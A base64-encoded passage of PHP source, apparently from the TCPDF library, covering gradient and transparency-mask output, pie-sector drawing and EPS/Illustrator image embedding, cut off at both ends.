D4+JzsKCQkJCQkkb3V0IC49ICJcbiIuJ2VuZG9iaic7CgkJCQkJJHRoaXMtPl9vdXQoJG91dCk7CgkJCQkJZm9yICgkaSA9IDE7ICRpIDwgJG51bV9jb2xzOyArKyRpKSB7CgkJCQkJCSR0aGlzLT5fbmV3b2JqKCk7CgkJCQkJCSRvdXQgPSAnPDwnOwoJCQkJCQkkb3V0IC49ICcgL0Z1bmN0aW9uVHlwZSAyJzsKCQkJCQkJJG91dCAuPSAnIC9Eb21haW4gWzAgMV0nOwoJCQkJCQkkb3V0IC49ICcgL0MwIFsnLiRncmFkWydjb2xvcnMnXVsoJGkgLSAxKV1bJ29wYWNpdHknXS4nXSc7CgkJCQkJCSRvdXQgLj0gJyAvQzEgWycuJGdyYWRbJ2NvbG9ycyddWyRpXVsnb3BhY2l0eSddLiddJzsKCQkJCQkJJG91dCAuPSAnIC9OICcuJGdyYWRbJ2NvbG9ycyddWyRpXVsnZXhwb25lbnQnXTsKCQkJCQkJJG91dCAuPSAnID4+JzsKCQkJCQkJJG91dCAuPSAiXG4iLidlbmRvYmonOwoJCQkJCQkkdGhpcy0+X291dCgkb3V0KTsKCQkJCQl9CgkJCQl9CgkJCX0KCQkJLy8gc2V0IHNoYWRpbmcgb2JqZWN0CgkJCSR0aGlzLT5fbmV3b2JqKCk7CgkJCSRvdXQgPSAnPDwgL1NoYWRpbmdUeXBlICcuJGdyYWRbJ3R5cGUnXTsKCQkJaWYgKGlzc2V0KCRncmFkWydjb2xzcGFjZSddKSkgewoJCQkJJG91dCAuPSAnIC9Db2xvclNwYWNlIC8nLiRncmFkWydjb2xzcGFjZSddOwoJCQl9IGVsc2UgewoJCQkJJG91dCAuPSAnIC9Db2xvclNwYWNlIC9EZXZpY2VSR0InOwoJCQl9CgkJCWlmIChpc3NldCgkZ3JhZFsnYmFja2dyb3VuZCddKSBBTkQgIWVtcHR5KCRncmFkWydiYWNrZ3JvdW5kJ10pKSB7CgkJCQkkb3V0IC49ICcgL0JhY2tncm91bmQgWycuJGdyYWRbJ2JhY2tncm91bmQnXS4nXSc7CgkJCX0KCQkJaWYgKGlzc2V0KCRncmFkWydhbnRpYWxpYXMnXSkgQU5EICgkZ3JhZFsnYW50aWFsaWFzJ10gPT09IHRydWUpKSB7CgkJCQkkb3V0IC49ICcgL0FudGlBbGlhcyB0cnVlJzsKCQkJfQoJCQlpZiAoJGdyYWRbJ3R5cGUnXSA9PSAyKSB7CgkJCQkkb3V0IC49ICcgJy5zcHJpbnRmKCcvQ29vcmRzIFslRiAlRiAlRiAlRl0nLCAkZ3JhZFsnY29vcmRzJ11bMF0sICRncmFkWydjb29yZHMnXVsxXSwgJGdyYWRbJ2Nvb3JkcyddWzJdLCAkZ3JhZFsnY29vcmRzJ11bM10pOwoJCQkJJG91dCAuPSAnIC9Eb21haW4gWzAgMV0nOwoJCQkJJG91dCAuPSAnIC9GdW5jdGlvbiAnLiRmYy4nIDAgUic7CgkJCQkkb3V0IC49ICcgL0V4dGVuZCBbdHJ1ZSB0cnVlXSc7CgkJCQkkb3V0IC49ICcgPj4nOwoJCQl9IGVsc2VpZiAoJGdyYWRbJ3R5cGUnXSA9PSAzKSB7CgkJCQkvL3gwLCB5MCwgcjAsIHgxLCB5MSwgcjEKCQkJCS8vYXQgdGhpcyB0aGlzIHRpbWUgcmFkaXVzIG9mIGlubmVyIGNpcmNsZSBpcyAwCgkJCQkkb3V0IC49ICcgJy5zcHJpbnRmKCcvQ29vcmRzIFslRiAlRiAwICVGICVGICVGXScsICRncmFkWydjb29yZHMnXVswXSwgJGdyYWRbJ2Nvb3JkcyddWzFdLCAkZ3JhZFsnY29vcmRzJ11bMl0sICRncmFkWydjb29yZHMnXVszXSwgJGdyYWRbJ2Nvb3JkcyddWzRdKTsKCQkJCSRvdXQgLj0gJyAvRG9tYWluIFswIDFdJzsKCQkJCSRvdXQgLj0gJyAvRnVuY3Rpb24gJy4kZmMuJyAwIFInOwoJCQkJJG91dCAuPSAnIC9FeHRlbmQgW3RydWUgdHJ1ZV0nOwoJCQkJJG91dCAuPSAnID4+JzsKCQkJfSBlbHNlaWYgKCRncmFkWyd0eXBlJ10gPT0gNikgewoJCQkJJG91dCAuPSAnIC9CaXRzUGVyQ29vcmRpbmF0ZSAxNic7CgkJCQkkb3V0IC49ICcgL0JpdHNQZXJDb21wb25lbnQgOCc7CgkJCQkkb3V0IC49ICcgL0RlY29kZVswIDEgMCAxIDAgMSAwIDEgMCAxXSc7CgkJCQkkb3V0IC49ICcgL0JpdHNQZXJGbGFnIDgnOwoJCQkJJHN0cmVhbSA9ICR0aGlzLT5fZ2V0cmF3c3RyZWFtKCRncmFkWydzdHJlYW0nXSk7CgkJCQkkb3V0IC49ICcgL0xlbmd0aCAnLnN0cmxlbigkc3RyZWFtKTsKCQkJCSRvdXQgLj0gJyA+Pic7CgkJCQkkb3V0IC49ICcgc3RyZWFtJy4iXG4iLiRzdHJlYW0uIlxuIi4nZW5kc3RyZWFtJzsKCQkJfQoJCQkkb3V0IC49ICJcbiIuJ2VuZG9iaic7CgkJCSR0aGlzLT5fb3V0KCRvdXQpOwoJCQlpZiAoJGdyYWRbJ3RyYW5zcGFyZW5jeSddKSB7CgkJCQkkc2hhZGluZ190cmFuc3BhcmVuY3kgPSBwcmVnX3JlcGxhY2UoJy9cL0NvbG9yU3BhY2UgXC9bXlxzXSsvc2knLCAnL0NvbG9yU3BhY2UgL0RldmljZUdyYXknLCAkb3V0KTsKCQkJCSRzaGFkaW5nX3RyYW5zcGFyZW5jeSA9IHByZWdfcmVwbGFjZSgnL1wvRnVuY3Rpb24gWzAtOV0rIC9zaScsICcvRnVuY3Rpb24gJy4kZnQuJyAnLCAkc2hhZGluZ190cmFuc3BhcmVuY3kpOwoJCQl9CgkJCSR0aGlzLT5ncmFkaWVudHNbJGlkXVsnaWQnXSA9ICR0aGlzLT5uOwoJCQkvLyBzZXQgcGF0dGVybiBvYmplY3QKCQkJJHRoaXMtPl9uZXdvYmooKTsKCQkJJG91dCA9ICc8PCAvVHlwZSAvUGF0dGVybiAvUGF0dGVyblR5cGUgMic7CgkJCSRvdXQgLj0gJyAvU2hhZGluZyAnLiR0aGlzLT5ncmFkaWVudHNbJGlkXVsnaWQnXS4nIDAgUic7CgkJCSRvdXQgLj0gJyA+Pic7CgkJCSRvdXQgLj0gIlxuIi4nZW5kb2JqJzsKCQkJJHRoaXMtPl9vdXQoJG91dCk7CgkJCSR0aGlzLT5ncmFkaWVudHNbJGlkXVsncGF0dGVybiddID0gJHRoaXMtPm47CgkJCS8vIHNldCBzaGFkaW5nIGFuZCBwYXR0ZXJuIGZvciB0cmFuc3BhcmVuY3kgbWFzawoJCQlpZiAoJGdyYWRbJ3RyYW5zcGFyZW5jeSddKSB7CgkJCQkvLyBsdW1pbm9zaXR5IHBhdHRlcm4KCQkJCSRpZGdzID0gJGlkICsgJGlkdDsKCQkJCSR0aGlzLT5fbmV3b2JqKCk7CgkJCQkkdGhpcy0+X291dCgkc2hhZGluZ190cmFuc3BhcmVuY3kpOwoJCQkJJHRoaXMtPmdyYWRpZW50c1skaWRnc11bJ2lkJ10gPSAkdGhpcy0+bjsKCQkJCSR0aGlzLT5fbmV3b2JqKCk7CgkJCQkkb3V0ID0gJzw8IC9UeXBlIC9QYXR0ZXJuIC9QYXR0ZXJuVHlwZSAyJzsKCQkJCSRvdXQgLj0gJyAvU2hhZGluZyAnLiR0aGlzLT5ncmFkaWVudHNbJGlkZ3NdWydpZCddLicgMCBSJzsKCQkJCSRvdXQgLj0gJyA+Pic7CgkJCQkkb3V0IC49ICJcbiIuJ2VuZG9iaic7CgkJCQkkdGhpcy0+X291dCgkb3V0KTsKCQkJCSR0aGlzLT5ncmFkaWVudHNbJGlkZ3NdWydwYXR0ZXJuJ10gPSAkdGhpcy0+bjsKCQkJCS8vIGx1bWlub3NpdHkgWE9iamVjdAoJCQkJJG9pZCA9ICR0aGlzLT5fbmV3b2JqKCk7CgkJCQkkdGhpcy0+eG9iamVjdHNbJ0xYJy4kb2lkXSA9IGFycmF5KCduJyA9PiAkb2lkKTsKCQkJCSRmaWx0ZXIgPSAnJzsKCQkJCSRzdHJlYW0gPSAncSAvYTAgZ3MgL1BhdHRlcm4gY3MgL3AnLiRpZGdzLicgc2NuIDAgMCAnLiR0aGlzLT53UHQuJyAnLiR0aGlzLT5oUHQuJyByZSBmIFEnOwoJCQkJaWYgKCR0aGlzLT5jb21wcmVzcykgewoJCQkJCSRmaWx0ZXIgPSAnIC9GaWx0ZXIgL0ZsYXRlRGVjb2RlJzsKCQkJCQkkc3RyZWFtID0gZ3pjb21wcmVzcygkc3RyZWFtKTsKCQkJCX0KCQkJCSRzdHJlYW0gPSAkdGhpcy0+X2dldHJhd3N0cmVhbSgkc3RyZWFtKTsKCQkJCSRvdXQgPSAnPDwgL1R5cGUgL1hPYmplY3QgL1N1YnR5cGUgL0Zvcm0gL0Zvcm1UeXBlIDEnLiRmaWx0ZXI7CgkJCQkkb3V0IC49ICcgL0xlbmd0aCAnLnN0cmxlbigkc3RyZWFtKTsKCQkJCSRyZWN0ID0gc3ByaW50ZignJUYgJUYnLCAkdGhpcy0+d1B0LCAkdGhpcy0+aFB0KTsKCQkJCSRvdXQgLj0gJyAvQkJveCBbMCAwICcuJHJlY3QuJ10nOwoJCQkJJG91dCAuPSAnIC9Hcm91cCA8PCAvVHlwZSAvR3JvdXAgL1MgL1RyYW5zcGFyZW5jeSAvQ1MgL0RldmljZUdyYXkgPj4nOwoJCQkJJG91dCAuPSAnIC9SZXNvdXJjZXMgPDwnOwoJCQkJJG91dCAuPSAnIC9FeHRHU3RhdGUgPDwgL2EwIDw8IC9jYSAxIC9DQSAxID4+ID4+JzsKCQkJCSRvdXQgLj0gJyAvUGF0dGVybiA8PCAvcCcuJGlkZ3MuJyAnLiR0aGlzLT5ncmFkaWVudHNbJGlkZ3NdWydwYXR0ZXJuJ10uJyAwIFIgPj4nOwoJCQkJJG91dCAuPSAnID4+JzsKCQkJCSRvdXQgLj0gJyA+PiAnOwoJCQkJJG91dCAuPSAnIHN0cmVhbScuIlxuIi4kc3RyZWFtLiJcbiIuJ2VuZHN0cmVhbSc7CgkJCQkkb3V0IC49ICJcbiIuJ2VuZG9iaic7CgkJCQkkdGhpcy0+X291dCgkb3V0KTsKCQkJCS8vIFNNYXNrCgkJCQkkdGhpcy0+X25ld29iaigpOwoJCQkJJG91dCA9ICc8PCAvVHlwZSAvTWFzayAvUyAvTHVtaW5vc2l0eSAvRyAnLigkdGhpcy0+biAtIDEpLicgMCBSID4+Jy4iXG4iLidlbmRvYmonOwoJCQkJJHRoaXMtPl9vdXQoJG91dCk7CgkJCQkvLyBFeHRHU3RhdGUKCQkJCSR0aGlzLT5fbmV3b2JqKCk7CgkJCQkkb3V0ID0gJzw8IC9UeXBlIC9FeHRHU3RhdGUgL1NNYXNrICcuKCR0aGlzLT5uIC0gMSkuJyAwIFIgL0FJUyBmYWxzZSA+PicuIlxuIi4nZW5kb2JqJzsKCQkJCSR0aGlzLT5fb3V0KCRvdXQpOwoJCQkJJHRoaXMtPmV4dGdzdGF0ZXNbXSA9IGFycmF5KCduJyA9PiAkdGhpcy0+biwgJ25hbWUnID0+ICdUR1MnLiRpZCk7CgkJCX0KCQl9Cgl9CgoJLyoqCgkgKiBEcmF3IHRoZSBzZWN0b3Igb2YgYSBjaXJjbGUuCgkgKiBJdCBjYW4gYmUgdXNlZCBmb3IgaW5zdGFuY2UgdG8gcmVuZGVyIHBpZSBjaGFydHMuCgkgKiBAcGFyYW0gZmxvYXQgJHhjIGFic2Npc3NhIG9mIHRoZSBjZW50ZXIuCgkgKiBAcGFyYW0gZmxvYXQgJHljIG9yZGluYXRlIG9mIHRoZSBjZW50ZXIuCgkgKiBAcGFyYW0gZmxvYXQgJHIgcmFkaXVzLgoJICogQHBhcmFtIGZsb2F0ICRhIHN0YXJ0IGFuZ2xlIChpbiBkZWdyZWVzKS4KCSAqIEBwYXJhbSBmbG9hdCAkYiBlbmQgYW5nbGUgKGluIGRlZ3JlZXMpLgoJICogQHBhcmFtIHN0cmluZyAkc3R5bGUgU3R5bGUgb2YgcmVuZGVyaW5nLiBTZWUgdGhlIGdldFBhdGhQYWludE9wZXJhdG9yKCkgZnVuY3Rpb24gZm9yIG1vcmUgaW5mb3JtYXRpb24uCgkgKiBAcGFyYW0gZmxvYXQgJGN3IGluZGljYXRlcyB3aGV0aGVyIHRvIGdvIGNsb2Nrd2lzZSAoZGVmYXVsdDogdHJ1ZSkuCgkgKiBAcGFyYW0gZmxvYXQgJG8gb3JpZ2luIG9mIGFuZ2xlcyAoMCBmb3IgMyBvJ2Nsb2NrLCA5MCBmb3Igbm9vbiwgMTgwIGZvciA5IG8nY2xvY2ssIDI3MCBmb3IgNiBvJ2Nsb2NrKS4gRGVmYXVsdDogOTAuCgkgKiBAYXV0aG9yIE1heGltZSBEZWxvcm1lLCBOaWNvbGEgQXN1bmkKCSAqIEBzaW5jZSAzLjEuMDAwICgyMDA4LTA2LTA5KQoJICogQHB1YmxpYwoJICovCglwdWJsaWMgZnVuY3Rpb24gUGllU2VjdG9yKCR4YywgJHljLCAkciwgJGEsICRiLCAkc3R5bGU9J0ZEJywgJGN3PXRydWUsICRvPTkwKSB7CgkJJHRoaXMtPlBpZVNlY3RvclhZKCR4YywgJHljLCAkciwgJHIsICRhLCAkYiwgJHN0eWxlLCAkY3csICRvKTsKCX0KCgkvKioKCSAqIERyYXcgdGhlIHNlY3RvciBvZiBhbiBlbGxpcHNlLgoJICogSXQgY2FuIGJlIHVzZWQgZm9yIGluc3RhbmNlIHRvIHJlbmRlciBwaWUgY2hhcnRzLgoJICogQHBhcmFtIGZsb2F0ICR4YyBhYnNjaXNzYSBvZiB0aGUgY2VudGVyLgoJICogQHBhcmFtIGZsb2F0ICR5YyBvcmRpbmF0ZSBvZiB0aGUgY2VudGVyLgoJICogQHBhcmFtIGZsb2F0ICRyeCB0aGUgeC1heGlzIHJhZGl1cy4KCSAqIEBwYXJhbSBmbG9hdCAkcnkgdGhlIHktYXhpcyByYWRpdXMuCgkgKiBAcGFyYW0gZmxvYXQgJGEgc3RhcnQgYW5nbGUgKGluIGRlZ3JlZXMpLgoJICogQHBhcmFtIGZsb2F0ICRiIGVuZCBhbmdsZSAoaW4gZGVncmVlcykuCgkgKiBAcGFyYW0gc3RyaW5nICRzdHlsZSBTdHlsZSBvZiByZW5kZXJpbmcuIFNlZSB0aGUgZ2V0UGF0aFBhaW50T3BlcmF0b3IoKSBmdW5jdGlvbiBmb3IgbW9yZSBpbmZvcm1hdGlvbi4KCSAqIEBwYXJhbSBmbG9hdCAkY3cgaW5kaWNhdGVzIHdoZXRoZXIgdG8gZ28gY2xvY2t3aXNlLgoJICogQHBhcmFtIGZsb2F0ICRvIG9yaWdpbiBvZiBhbmdsZXMgKDAgZm9yIDMgbydjbG9jaywgOTAgZm9yIG5vb24sIDE4MCBmb3IgOSBvJ2Nsb2NrLCAyNzAgZm9yIDYgbydjbG9jaykuCgkgKiBAcGFyYW0gaW50ZWdlciAkbmMgTnVtYmVyIG9mIGN1cnZlcyB1c2VkIHRvIGRyYXcgYSA5MCBkZWdyZWVzIHBvcnRpb24gb2YgYXJjLgoJICogQGF1dGhvciBNYXhpbWUgRGVsb3JtZSwgTmljb2xhIEFzdW5pCgkgKiBAc2luY2UgMy4xLjAwMCAoMjAwOC0wNi0wOSkKCSAqIEBwdWJsaWMKCSAqLwoJcHVibGljIGZ1bmN0aW9uIFBpZVNlY3RvclhZKCR4YywgJHljLCAkcngsICRyeSwgJGEsICRiLCAkc3R5bGU9J0ZEJywgJGN3PWZhbHNlLCAkbz0wLCAkbmM9MikgewoJCWlmICgkdGhpcy0+c3RhdGUgIT0gMikgewoJCQkgcmV0dXJuOwoJCX0KCQlpZiAoJHRoaXMtPnJ0bCkgewoJCQkkeGMgPSAoJHRoaXMtPncgLSAkeGMpOwoJCX0KCQkkb3AgPSBUQ1BERl9TVEFUSUM6OmdldFBhdGhQYWludE9wZXJhdG9yKCRzdHlsZSk7CgkJaWYgKCRvcCA9PSAnZicpIHsKCQkJJGxpbmVfc3R5bGUgPSBhcnJheSgpOwoJCX0KCQlpZiAoJGN3KSB7CgkJCSRkID0gJGI7CgkJCSRiID0gKDM2MCAtICRhICsgJG8pOwoJCQkkYSA9ICgzNjAgLSAkZCArICRvKTsKCQl9IGVsc2UgewoJCQkkYiArPSAkbzsKCQkJJGEgKz0gJG87CgkJfQoJCSR0aGlzLT5fb3V0ZWxsaXB0aWNhbGFyYygkeGMsICR5YywgJHJ4LCAkcnksIDAsICRhLCAkYiwgdHJ1ZSwgJG5jKTsKCQkkdGhpcy0+X291dCgkb3ApOwoJfQoKCS8qKgoJICogRW1iZWQgdmVjdG9yLWJhc2VkIEFkb2JlIElsbHVzdHJhdG9yIChBSSkgb3IgQUktY29tcGF0aWJsZSBFUFMgZmlsZXMuCgkgKiBOT1RFOiBFUFMgaXMgbm90IHlldCBmdWxseSBpbXBsZW1lbnRlZCwgdXNlIHRoZSBzZXRSYXN0ZXJpemVWZWN0b3JJbWFnZXMoKSBtZXRob2QgdG8gZW5hYmxlL2Rpc2FibGUgcmFzdGVyaXphdGlvbiBvZiB2ZWN0b3IgaW1hZ2VzIHVzaW5nIEltYWdlTWFnaWNrIGxpYnJhcnkuCgkgKiBPbmx5IHZlY3RvciBkcmF3aW5nIGlzIHN1cHBvcnRlZCwgbm90IHRleHQgb3IgYml0bWFwLgoJICogQWx0aG91Z2ggdGhlIHNjcmlwdCB3YXMgc3VjY2Vzc2Z1bGx5IHRlc3RlZCB3aXRoIHZhcmlvdXMgQUkgZm9ybWF0IHZlcnNpb25zLCBiZXN0IHJlc3VsdHMgYXJlIHByb2JhYmx5IGFjaGlldmVkIHdpdGggZmlsZXMgdGhhdCB3ZXJlIGV4cG9ydGVkIGluIHRoZSBBSTMgZm9ybWF0ICh0ZXN0ZWQgd2l0aCBJbGx1c3RyYXRvciBDUzIsIEZyZWVoYW5kIE1YIGFuZCBQaG90b3Nob3AgQ1MyKS4KCSAqIEBwYXJhbSBzdHJpbmcgJGZpbGUgTmFtZSBvZiB0aGUgZmlsZSBjb250YWluaW5nIHRoZSBpbWFnZSBvciBhICdAJyBjaGFyYWN0ZXIgZm9sbG93ZWQgYnkgdGhlIEVQUy9BSSBkYXRhIHN0cmluZy4KCSAqIEBwYXJhbSBmbG9hdHxudWxsICR4IEFic2Npc3NhIG9mIHRoZSB1cHBlci1sZWZ0IGNvcm5lci4KCSAqIEBwYXJhbSBmbG9hdHxudWxsICR5IE9yZGluYXRlIG9mIHRoZSB1cHBlci1sZWZ0IGNvcm5lci4KCSAqIEBwYXJhbSBmbG9hdCAkdyBXaWR0aCBvZiB0aGUgaW1hZ2UgaW4gdGhlIHBhZ2UuIElmIG5vdCBzcGVjaWZpZWQgb3IgZXF1YWwgdG8gemVybywgaXQgaXMgYXV0b21hdGljYWxseSBjYWxjdWxhdGVkLgoJICogQHBhcmFtIGZsb2F0ICRoIEhlaWdodCBvZiB0aGUgaW1hZ2UgaW4gdGhlIHBhZ2UuIElmIG5vdCBzcGVjaWZpZWQgb3IgZXF1YWwgdG8gemVybywgaXQgaXMgYXV0b21hdGljYWxseSBjYWxjdWxhdGVkLgoJICogQHBhcmFtIG1peGVkICRsaW5rIFVSTCBvciBpZGVudGlmaWVyIHJldHVybmVkIGJ5IEFkZExpbmsoKS4KCSAqIEBwYXJhbSBib29sZWFuICR1c2VCb3VuZGluZ0JveCBzcGVjaWZpZXMgd2hldGhlciB0byBwb3NpdGlvbiB0aGUgYm91bmRpbmcgYm94ICh0cnVlKSBvciB0aGUgY29tcGxldGUgY2FudmFzIChmYWxzZSkgYXQgbG9jYXRpb24gKHgseSkuIERlZmF1bHQgdmFsdWUgaXMgdHJ1ZS4KCSAqIEBwYXJhbSBzdHJpbmcgJGFsaWduIEluZGljYXRlcyB0aGUgYWxpZ25tZW50IG9mIHRoZSBwb2ludGVyIG5leHQgdG8gaW1hZ2UgaW5zZXJ0aW9uIHJlbGF0aXZlIHRvIGltYWdlIGhlaWdodC4gVGhlIHZhbHVlIGNhbiBiZTo8dWw+PGxpPlQ6IHRvcC1yaWdodCBmb3IgTFRSIG9yIHRvcC1sZWZ0IGZvciBSVEw8L2xpPjxsaT5NOiBtaWRkbGUtcmlnaHQgZm9yIExUUiBvciBtaWRkbGUtbGVmdCBmb3IgUlRMPC9saT48bGk+QjogYm90dG9tLXJpZ2h0IGZvciBMVFIgb3IgYm90dG9tLWxlZnQgZm9yIFJUTDwvbGk+PGxpPk46IG5leHQgbGluZTwvbGk+PC91bD4KCSAqIEBwYXJhbSBzdHJpbmcgJHBhbGlnbiBBbGxvd3MgdG8gY2VudGVyIG9yIGFsaWduIHRoZSBpbWFnZSBvbiB0aGUgY3VycmVudCBsaW5lLiBQb3NzaWJsZSB2YWx1ZXMgYXJlOjx1bD48bGk+TCA6IGxlZnQgYWxpZ248L2xpPjxsaT5DIDogY2VudGVyPC9saT48bGk+UiA6IHJpZ2h0IGFsaWduPC9saT48bGk+JycgOiBlbXB0eSBzdHJpbmcgOiBsZWZ0IGZvciBMVFIgb3IgcmlnaHQgZm9yIFJUTDwvbGk+PC91bD4KCSAqIEBwYXJhbSBtaXhlZCAkYm9yZGVyIEluZGljYXRlcyBpZiBib3JkZXJzIG11c3QgYmUgZHJhd24gYXJvdW5kIHRoZSBjZWxsLiBUaGUgdmFsdWUgY2FuIGJlIGEgbnVtYmVyOjx1bD48bGk+MDogbm8gYm9yZGVyIChkZWZhdWx0KTwvbGk+PGxpPjE6IGZyYW1lPC9saT48L3VsPiBvciBhIHN0cmluZyBjb250YWluaW5nIHNvbWUgb3IgYWxsIG9mIHRoZSBmb2xsb3dpbmcgY2hhcmFjdGVycyAoaW4gYW55IG9yZGVyKTo8dWw+PGxpPkw6IGxlZnQ8L2xpPjxsaT5UOiB0b3A8L2xpPjxsaT5SOiByaWdodDwvbGk+PGxpPkI6IGJvdHRvbTwvbGk+PC91bD4gb3IgYW4gYXJyYXkgb2YgbGluZSBzdHlsZXMgZm9yIGVhY2ggYm9yZGVyIGdyb3VwIC0gZm9yIGV4YW1wbGU6IGFycmF5KCdMVFJCJyA9PiBhcnJheSgnd2lkdGgnID0+IDIsICdjYXAnID0+ICdidXR0JywgJ2pvaW4nID0+ICdtaXRlcicsICdkYXNoJyA9PiAwLCAnY29sb3InID0+IGFycmF5KDAsIDAsIDApKSkKCSAqIEBwYXJhbSBib29sZWFuICRmaXRvbnBhZ2UgaWYgdHJ1ZSB0aGUgaW1hZ2UgaXMgcmVzaXplZCB0byBub3QgZXhjZWVkIHBhZ2UgZGltZW5zaW9ucy4KCSAqIEBwYXJhbSBib29sZWFuICRmaXhvdXR2YWxzIGlmIHRydWUgcmVtb3ZlIHZhbHVlcyBvdXRzaWRlIHRoZSBib3VuZGluZyBib3guCgkgKiBAYXV0aG9yIFZhbGVudGluIFNjaG1pZHQsIE5pY29sYSBBc3VuaQoJICogQHNpbmNlIDMuMS4wMDAgKDIwMDgtMDYtMDkpCgkgKiBAcHVibGljCgkgKi8KCXB1YmxpYyBmdW5jdGlvbiBJbWFnZUVwcygkZmlsZSwgJHg9bnVsbCwgJHk9bnVsbCwgJHc9MCwgJGg9MCwgJGxpbms9JycsICR1c2VCb3VuZGluZ0JveD10cnVlLCAkYWxpZ249JycsICRwYWxpZ249JycsICRib3JkZXI9MCwgJGZpdG9ucGFnZT1mYWxzZSwgJGZpeG91dHZhbHM9ZmFsc2UpIHsKCQlpZiAoJHRoaXMtPnN0YXRlICE9IDIpIHsKCQkJIHJldHVybjsKCQl9CgkJaWYgKCR0aGlzLT5yYXN0ZXJpemVfdmVjdG9yX2ltYWdlcyBBTkQgKCR3ID4gMCkgQU5EICgkaCA+IDApKSB7CgkJCS8vIGNvbnZlcnQgRVBTIHRvIHJhc3RlciBpbWFnZSB1c2luZyBHRCBvciBJbWFnZU1hZ2ljayBsaWJyYXJpZXMKCQkJcmV0dXJuICR0aGlzLT5JbWFnZSgkZmlsZSwgJHgsICR5LCAkdywgJGgsICdFUFMnLCAkbGluaywgJGFsaWduLCB0cnVlLCAzMDAsICRwYWxpZ24sIGZhbHNlLCBmYWxzZSwgJGJvcmRlciwgZmFsc2UsIGZhbHNlLCAkZml0b25wYWdlKTsKCQl9CgkJaWYgKFRDUERGX1NUQVRJQzo6ZW1wdHlfc3RyaW5nKCR4KSkgewoJCQkkeCA9ICR0aGlzLT54OwoJCX0KCQlpZiAoVENQREZfU1RBVElDOjplbXB0eV9zdHJpbmcoJHkpKSB7CgkJCSR5ID0gJHRoaXMtPnk7CgkJfQoJCS8vIGNoZWNrIHBhZ2UgZm9yIG5vLXdyaXRlIHJlZ2lvbnMgYW5kIGFkYXB0IHBhZ2UgbWFyZ2lucyBpZiBuZWNlc3NhcnkKCQlsaXN0KCR4LCAkeSkgPSAkdGhpcy0+Y2hlY2tQYWdlUmVnaW9ucygkaCwgJHgsICR5KTsKCQkkayA9ICR0aGlzLT5rOwoJCWlmICgkZmlsZVswXSA9PT0gJ0AnKSB7IC8vIGltYWdlIGZyb20gc3RyaW5nCgkJCSRkYXRhID0gc3Vic3RyKCRmaWxlLCAxKTsKCQl9IGVsc2UgeyAvLyBFUFMvQUkgZmlsZQogICAgICAgICAgICAkZGF0YSA9ICR0aGlzLT5nZXRDYWNoZWRGaWxlQ29udGVudHMoJGZpbGUpOwoJCX0KCQlpZiAoJGRhdGEgPT09IEZBTFNFKSB7CgkJCSR0aGlzLT5FcnJvcignRVBTIGZpbGUgbm90IGZvdW5kOiAnLiRmaWxlKTsKCQl9CgkJJHJlZ3MgPSBhcnJheSgpOwoJCS8vIEVQUy9BSSBjb21wYXRpYmlsaXR5IGNoZWNrIChvbmx5IGNoZWNrcyBmaWxlcyBjcmVhdGVkIGJ5IEFkb2JlIElsbHVzdHJhdG9yISkKCQlwcmVnX21hdGNoKCIvJSVDcmVhdG9yOihbXlxyXG5dKykvIiwgJGRhdGEsICRyZWdzKTsgIyBmaW5kIENyZWF0b3IKCQlpZiAoY291bnQoJHJlZ3MpID4gMSkgewoJCQkkdmVyc2lvbl9zdHIgPSB0cmltKCRyZWdzWzFdKTsgIyBlLmcuICJBZG9iZSBJbGx1c3RyYXRvcihSKSA4LjAiCgkJCWlmIChzdHJwb3MoJHZlcnNpb25fc3RyLCAnQWRvYmUgSWxsdXN0cmF0b3InKSAhPT0gZmFsc2UpIHsKCQkJCSR2ZXJzZXhwID0gZXhwbG9kZSgnICcsICR2ZXJzaW9uX3N0cik7CgkJCQkkdmVyc2lvbiA9IChmbG9hdClhcnJheV9wb3AoJHZlcnNleHApOwoJCQkJaWYgKCR2ZXJzaW9uID49IDkpIHsKCQkJCQkkdGhpcy0+RXJyb3IoJ1RoaXMgdmVyc2lvbiBvZiBBZG9iZSBJbGx1c3RyYXRvciBmaWxlIGlzIG5vdCBzdXBwb3J0ZWQ6ICcuJGZpbGUpOwoJCQkJfQoJCQl9CgkJfQoJCS8vIHN0cmlwIGJpbmFyeSBieXRlcyBpbiBmcm9udCBvZiBQUy1oZWFkZXIKCQkkc3RhcnQgPSBzdHJwb3MoJGRhdGEsICclIVBTLUFkb2JlJyk7CgkJaWYgKCRzdGFydCA+IDApIHsKCQkJJGRhdGEgPSBzdWJzdHIoJGRhdGEsICRzdGFydCk7CgkJfQoJCS8vIGZpbmQgQm91bmRpbmdCb3ggcGFyYW1zCgkJcHJlZ19tYXRjaCgiLyUlQm91bmRpbmdCb3g6KFteXHJcbl0rKS8iLCAkZGF0YSwgJHJlZ3MpOwoJCWlmIChjb3VudCgkcmVncykgPiAxKSB7CgkJCWxpc3QoJHgxLCAkeTEsICR4MiwgJHkyKSA9IGV4cGxvZGUoJyAnLCB0cmltKCRyZWdzWzFdKSk7CgkJfSBlbHNlIHsKCQkJJHRoaXMtPkVycm9yKCdObyBCb3VuZGluZ0JveCBmb3VuZCBpbiBFUFMvQUkgZmlsZTogJy4kZmlsZSk7CgkJfQoJCSRzdGFydCA9IHN0cnBvcygkZGF0YSwgJyUlRW5kU2V0dXAnKTsKCQlpZiAoJHN0YXJ0ID09PSBmYWxzZSkgewoJCQkkc3RhcnQgPSBzdHJwb3MoJGRhdGEsICclJUVuZFByb2xvZycpOwoJCX0KCQlpZiAoJHN0YXJ0ID09PSBmYWxzZSkgewoJCQkkc3RhcnQgPSBzdHJwb3MoJGRhdGEsICclJUJvdW5kaW5nQm94Jyk7CgkJfQoJCSRkYXRhID0gc3Vic3RyKCRkYXRhLCAkc3RhcnQpOwoJCSRlbmQgPSBzdHJwb3MoJGRhdGEsICclJVBhZ2VUcmFpbGVyJyk7CgkJaWYgKCRlbmQ9PT1mYWxzZSkgewoJCQkkZW5kID0gc3RycG9zKCRkYXRhLCAnc2hvd3BhZ2UnKTsKCQl9CgkJaWYgKCRlbmQpIHsKCQkJJGRhdGEgPSBzdWJzdHIoJGRhdGEsIDAsICRlbmQpOwoJCX0KCQkvLyBjYWxjdWxhdGUgaW1hZ2Ugd2lkdGggYW5kIGhlaWdodCBvbiBkb2N1bWVudAoJCWlmICgoJHcgPD0gMCkgQU5EICgkaCA8PSAwKSkgewoJCQkkdyA9ICgkeDIgLSAkeDEpIC8gJGs7CgkJCSRoID0gKCR5MiAtICR5MSkgLyAkazsKCQl9IGVsc2VpZiAoJHcgPD0gMCkgewoJCQkkdyA9ICgkeDItJHgxKSAvICRrICogKCRoIC8gKCgkeTIgLSAkeTEpIC8gJGspKTsKCQl9IGVsc2VpZiAoJGggPD0gMCkgewoJCQkkaCA9ICgkeTIgLSAkeTEpIC8